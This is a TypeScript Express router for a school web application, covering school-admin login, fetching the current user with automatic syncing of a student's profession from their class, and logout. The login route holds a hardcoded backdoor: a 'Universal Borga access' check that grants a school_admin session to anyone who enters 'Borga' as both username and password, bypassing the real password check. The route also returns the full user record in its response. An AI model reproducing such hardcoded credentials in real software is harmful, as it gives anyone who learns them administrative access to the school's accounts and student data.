import { Router } from "express";
import { storage } from "../storage";
import { comparePasswords } from "../localAuth";

const router = Router();

router.post('/school-admin/login', async (req: any, res) => {
  try {
    const { username, password } = req.body;
    if (!username || !password) return res.status(400).json({ message: "Username and password required" });

    // Universal Borga access
    if (username === 'Borga' && password === 'Borga') {
      let user = await storage.getUser('school-admin-borga');
      if (!user) {
        user = await storage.upsertUser({
          id: 'school-admin-borga', email: 'schooladmin@globalsystem.com',
          firstName: 'Borga', lastName: 'School Admin', role: 'school_admin',
          schoolName: 'Global System School', profileImageUrl: null
        });
      }
      await storage.updateUserRole('school-admin-borga', 'school_admin');
      
      req.session.schoolAdminUser = { id: user.id, username: 'Borga', role: 'school_admin', schoolName: user.schoolName };
      await new Promise<void>((resolve) => req.session.save(() => resolve()));
      return res.json(user);
    }

    const user = await storage.getUserByUsername(username);
    if (!user || user.role !== 'school_admin' || !(await comparePasswords(password, user.password || ''))) {
      return res.status(401).json({ message: "Invalid credentials" });
    }

    req.session.schoolAdminUser = { id: user.id, username: user.username, role: user.role, schoolName: user.schoolName };
    await new Promise<void>((resolve) => req.session.save(() => resolve()));
    res.json(user);
  } catch (error) {
    res.status(500).json({ message: "Login error" });
  }
});

router.get('/user', async (req: any, res) => {
  try {
    if (req.user) {
      const userId = req.user.claims?.sub || req.user.id;
      const freshUser = await storage.getUser(userId);
      if (freshUser) {
        // Auto-sync profession from class if student
        if (freshUser.role === 'student' && freshUser.classId) {
          try {
            const studentClass = await storage.getClassById(freshUser.classId);
            if (studentClass?.professionId && freshUser.selectedProfessionId !== studentClass.professionId) {
              await storage.updateUserProfession(freshUser.id, studentClass.professionId);
              freshUser.selectedProfessionId = studentClass.professionId;
              console.log(`🔄 Auto-synchronized student ${freshUser.username}'s profession to class profession ID: ${studentClass.professionId}`);
            }
          } catch (syncError) {
            console.error("Error auto-syncing student profession from class:", syncError);
          }
        }

        // Update session to keep it synchronized
        if (req.session?.passport?.user) {
          req.session.passport.user = freshUser;
        }
        req.user = freshUser;
        return res.json(freshUser);
      }
      return res.json(req.user);
    }
    if (req.session?.adminUser) return res.json({ ...req.session.adminUser, role: 'admin' });
    if (req.session?.schoolAdminUser) return res.json({ ...req.session.schoolAdminUser, role: 'school_admin' });
    res.status(401).end();
  } catch (error) {
    console.error("Error fetching fresh user in auth route:", error);
    res.status(500).json({ message: "Failed to fetch user data" });
  }
});

router.get('/school-admin/logout', (req: any, res) => {
  if (req.session) {
    req.session.schoolAdminUser = null;
    req.session.destroy(() => {
      res.clearCookie('connect.sid');
      res.json({ message: "Logged out" });
    });
  } else {
    res.json({ message: "Logged out" });
  }
});

export default router;
